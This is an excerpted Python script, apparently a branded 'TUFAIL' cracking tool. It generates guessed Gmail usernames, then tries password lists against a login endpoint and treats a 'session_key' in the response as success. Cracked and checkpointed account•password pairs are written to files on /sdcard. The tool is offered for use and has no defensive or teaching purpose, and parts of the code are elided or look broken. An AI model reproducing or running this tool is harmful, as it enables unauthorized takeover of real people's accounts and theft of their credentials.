...
os.system('xdg-open https://youtube.com/@musatricks9563')
...
logo= f'''
 ...
 ________  __    __  ________   ______   ______  __                              _______   _______    ______   __    __  _______  
...
\033[1;97m Owner  : TUFAIL x BRAND

\033[1;97m GitHub : TUFAIL x BRAND
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/TUFAIL-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=TUFAIL-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=TUFAIL-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .TUFAIL')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.TUFAIL','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.TUFAIL', 'r').read().splitlines()
...
def method():
    ...
    if 'o':      
        ...
        lp = input(f'{oo("?")}How many Password  ADD ')
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mTUFAIL-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/TUFAIL-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mTUFAIL-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/TUFAIL-CP.txt','a').write(f'{acc} • {pword}\n')
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/TUFAIL-OK.txt")
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mTUFAI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
